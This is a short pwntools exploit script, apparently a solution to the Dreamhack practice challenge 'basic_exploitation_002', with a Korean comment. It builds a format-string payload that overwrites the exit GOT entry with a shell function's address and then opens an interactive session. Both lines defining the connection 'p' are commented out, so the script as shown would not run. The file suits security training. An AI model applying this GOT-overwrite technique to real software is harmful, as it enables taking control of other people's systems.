from pwn import *

# shell = 0x08048609
#p = remote('host3.dreamhack.games', '11460')
#p = process('./basic_exploitation_002')
e = ELF('./basic_exploitation_002')

exit_got = e.got['exit']

shell = 0x08048609
'''
0x08048609를 전달해야 하는데 2바이트씩 나누어서 보내야함
0x0804 - 8 || 0x8609 - 0x0804 씩 보내야함
'''
#payload = p32(exit_got + 2) + p32(exit_got) + b"%2044c%1$hn" + b"%32261c%2$hn"
payload = fmtstr_payload(1, {exit_got : int(shell)})

p.send(payload)
p.interactive()